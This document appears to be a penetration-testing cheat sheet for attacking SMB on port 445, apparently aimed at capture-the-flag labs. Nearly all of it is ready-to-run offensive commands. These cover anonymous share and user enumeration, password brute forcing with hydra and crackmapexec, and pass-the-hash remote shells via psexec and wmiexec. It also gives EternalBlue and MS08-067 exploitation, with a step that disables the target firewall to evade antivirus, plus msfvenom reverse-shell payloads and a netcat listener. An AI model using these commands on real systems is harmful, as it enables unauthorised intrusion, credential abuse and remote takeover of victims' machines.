## SMB Enumeration - 445

### Version if nmap didn’t detect it

Sometimes nmap doesn’t show the version of Samba in the remote host, if this happens, a good way to know which version the remote host is running, is to `capture traffic with wireshark against the remote host on 445/139 and in parallel run an smbclient -L`, do a follow tcp stream and with this we might see which version the server is running.

OR

```bash
sudo ngrep -i -d <INTERFACE> 's.?a.?m.?b.?a.*[[:digit:]]' port 139
smbclient -L <IP>
```

### Scan for vulnerability

```bash
nmap -p139,445 -Pn --script "smb-vuln-* and not(smb-vuln-regsvc-dos)" --script-args smb-vuln-cve-2017-7494.check-version,unsafe=1 <IP>
```

## Manual Testing

```bash
smbmap -H <IP>
smbmap -u '' -p '' -H <IP>
smbmap -u 'guest' -p '' -H <IP>
smbmap -u '' -p '' -H <IP> -R <Path>

crackmapexec smb <IP>
crackmapexec smb <IP> -u '' -p ''
crackmapexec smb <IP> -u 'guest' -p ''
crackmapexec smb <IP> -u '' -p '' --shares
crackmapexec smb <IP> -u '' -p '' --users

#crawl all the shares and generate a file in tmp folder
crackmapexec smb <IP> -u '' -p '' -M spider_plus


enum4linux -a <IP>

smbclient --no-pass -L //$IP
smbclient //<IP>/<SHARE>

# Download all files from a directory recursively
smbclient //<IP>/<SHARE> -U <USER> -c "prompt OFF;recurse ON;mget *"

# Check user
rpcclient -U '' writer.htb
rpcclient -U '' -N writer.htb
> enumdomusers
> queryuser <username
# https://bitvijays.github.io/LFF-IPS-P3-Exploitation.html
```

### Brute force

```bash
crackmapexec smb <IP> -u <USERS_LIST> -p <PASSWORDS_LIST>
hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> smb://<IP> -u -vV
Mount a SMB share
mkdir /tmp/share
sudo mount -t cifs //<IP>/<SHARE> /tmp/share
sudo mount -t cifs -o 'username=<USER>,password=<PASSWORD>'//<IP>/<SHARE> /tmp/share

smbclient //<IP>/<SHARE>
smbclient //<IP>/<SHARE> -U <USER>
Get a shell
psexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
psexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
wmiexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

smbexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
smbexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

atexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP> <COMMAND>
atexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
```

### EternalBlue (MS17-010)
Exploit Code - `git clone https://github.com/3ndG4me/AutoBlue-MS17-010`
Check if vulnerable - `python eternal_checker.py <IP>`
Custom exploit (Bypass Antivirus)
```bash
service_exec(conn, r'cmd /c netsh firewall set opmode disable')
smb_send_file(smbConn,'Your favourite file location','C','/yourfile')
service_exec(conn, r'cmd /c C:\yourfile <some syntax>')
```

#### Prepare shellcodes and listeners
```
cd shellcode
./shell_prep.sh
cd ..
./listener_prep.sh
```

#### Exploit
```
python eternalblue_exploit<NUMBER>.py <IP> shellcode/sc_all.bin

May need to run it multiple times
If this doesn’t work, try this one
python zzz_exploit.py <IP>
```

### MS08-067
Download exploit code - `git clone https://github.com/andyacer/ms08_067.git`

#### Generate payload

```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
msfvenom -p windows/shell_bind_tcp RHOST=<IP> LPORT=<PORT> EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
```

#### Modify
Modify ms08\_067\_2018.py and replace the shellcode variable by the one generated with msfvenom.

#### Listener
`nc -lvp <PORT>`

#### Exploit
`python ms08_067_2018.py <IP> <NUMBER> 445`

### Errors with Solution
Error - protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
Solution - `smbclient -L //10.10.10.3/ --option='client min protocol=NT1'`

### msf console for changing smb setting
```bash
set SMB::AlwaysEncrypt false
set SMB::ProtocolVersion 1
```
